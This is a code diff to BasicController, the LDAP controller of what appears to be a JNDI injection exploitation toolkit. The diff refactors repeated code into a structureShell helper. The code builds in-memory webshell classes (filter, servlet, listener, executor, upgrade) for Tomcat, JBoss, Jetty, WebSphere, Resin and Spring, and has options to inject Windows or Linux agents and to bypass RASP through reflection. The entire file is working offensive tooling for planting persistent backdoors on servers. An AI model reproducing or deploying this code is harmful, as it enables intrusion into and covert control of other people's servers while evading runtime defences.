@@ -4,6 +4,7 @@ import com.nu1r.jndi.enumtypes.GadgetType;
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
+import com.nu1r.jndi.gadgets.ObjectPayload;
 import com.nu1r.jndi.gadgets.utils.InjShell;
 import com.nu1r.jndi.template.*;
 import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
@@ -31,9 +32,8 @@ import org.apache.commons.codec.binary.Base64;
 import java.net.URL;
 
 import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
-import static com.nu1r.jndi.gadgets.utils.InjShell.insertLinAgent;
-import static com.nu1r.jndi.gadgets.utils.InjShell.insertWinAgent;
 import static com.nu1r.jndi.gadgets.Config.Config.*;
+import static com.nu1r.jndi.gadgets.utils.InjShell.*;
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/basic"})
@@ -42,7 +42,7 @@ public class BasicController implements LdapController {
     private final  String      codebase = Config.codeBase;
     private static PayloadType payloadType;
     private        String[]    params;
-    private       GadgetType  gadgetType;
+    private        GadgetType  gadgetType;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -63,148 +63,28 @@ public class BasicController implements LdapController {
                 className = SpringEchoTemplate.class.getName();
                 break;
             case tomcatfilterjmx:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(TFMSFromJMXF.class));
-                ctClass = pool.get(TFMSFromJMXF.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(TFJMX.class);
                 break;
             case tomcatfilterth:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(TFMSFromThreadF.class));
-                ctClass = pool.get(TFMSFromThreadF.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(TFMSFromThreadF.class);
                 break;
             case tomcatlistenerjmx:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(TLMSFromJMXLi.class));
-                ctClass = pool.get(TLMSFromJMXLi.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(TLMSFromJMXLi.class);
                 break;
             case tomcatlistenerth:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(TLMSFromThreadLi.class));
-                ctClass = pool.get(TLMSFromThreadLi.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(TLMSFromThreadLi.class);
                 break;
             case tomcatservletjmx:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(TSMSFromJMXS.class));
-                ctClass = pool.get(TSMSFromJMXS.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(TSMSFromJMXS.class);
                 break;
             case tomcatservletth:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(TSMSFromThreadS.class));
-                ctClass = pool.get(TSMSFromThreadS.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(TSMSFromThreadS.class);
                 break;
             case jbossfilter:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(JBFMSFromContextF.class));
-                ctClass = pool.get(JBFMSFromContextF.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(JBFMSFromContextF.class);
                 break;
             case jbossservlet:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(JBSMSFromContextS.class));
-                ctClass = pool.get(JBSMSFromContextS.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(JBSMSFromContextS.class);
                 break;
             case webspherememshell:
                 className = WebsphereMemshellTemplate.class.getName();
@@ -228,11 +108,11 @@ public class BasicController implements LdapController {
                 String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                 ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                 ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
-                if (winAgent){
+                if (winAgent) {
                     className = insertWinAgent(ctClass);
                     break;
                 }
-                if (linAgent){
+                if (linAgent) {
                     className = insertLinAgent(ctClass);
                     break;
                 }
@@ -243,130 +123,25 @@ public class BasicController implements LdapController {
                 className = isSuccess.class.getName();
                 break;
             case jettyfilter:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(JFMSFromJMXF.class));
-                ctClass = pool.get(JFMSFromJMXF.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(JFMSFromJMXF.class);
                 break;
             case jettyservlet:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(JSMSFromJMXS.class));
-                ctClass = pool.get(JSMSFromJMXS.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(JSMSFromJMXS.class);
                 break;
             case wsfilter:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(WSFMSFromThread.class));
-                ctClass = pool.get(WSFMSFromThread.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(WSFMSFromThread.class);
                 break;
             case tomcatexecutor:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
-                ctClass = pool.get(TWSMSFromThread.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(TWSMSFromThread.class);
                 break;
             case resinfilterth:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(RFMSFromThreadF.class));
-                ctClass = pool.get(RFMSFromThreadF.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(RFMSFromThreadF.class);
                 break;
             case resinservletth:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(RSMSFromThreadS.class));
-                ctClass = pool.get(RSMSFromThreadS.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(RSMSFromThreadS.class);
                 break;
             case tomcatupgrade:
-                Config.init();
-                pool = ClassPool.getDefault();
-                pool.insertClassPath(new ClassClassPath(TUGMSFromJMXuP.class));
-                ctClass = pool.get(TUGMSFromJMXuP.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
-                ctClass.setName(generateClassName());
-                if (winAgent){
-                    className = insertWinAgent(ctClass);
-                    break;
-                }
-                if (linAgent){
-                    className = insertLinAgent(ctClass);
-                    break;
-                }
-                className = ctClass.getName();
-                ctClass.writeFile();
+                className = structureShell(TUGMSFromJMXuP.class);
                 break;
         }
 
@@ -423,7 +198,7 @@ public class BasicController implements LdapController {
                     }
                     if (url1.contains("obscure")) {
                         IS_OBSCURE = true;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@" ));
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
                     }
                     if (url1.contains("winAgent")) {
                         winAgent = true;
